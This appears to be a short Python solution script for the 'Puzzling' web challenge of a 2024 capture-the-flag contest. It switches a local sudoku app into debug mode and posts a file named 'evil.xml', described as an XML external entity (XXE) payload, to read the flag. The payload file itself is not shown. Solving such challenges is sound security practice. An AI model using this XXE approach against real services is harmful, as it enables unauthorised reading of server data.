# Solution for "Puzzling" web challenge for HackUCF Sunshine CTF 2024

import requests

URL = "http://127.0.0.1:1337"

# Set difficulty to "debug"
S = requests.Session()

S.get(URL+"/sudoku/setDifficulty/debug")

headers = {
    'Content-Type': 'application/xml',
}

xml_data = open("evil.xml").read()

# Send malicious board with XXE payload to get flag in debug data
response = S.post(URL+"/sudoku/submit", data=xml_data, headers=headers)

print(response.text)
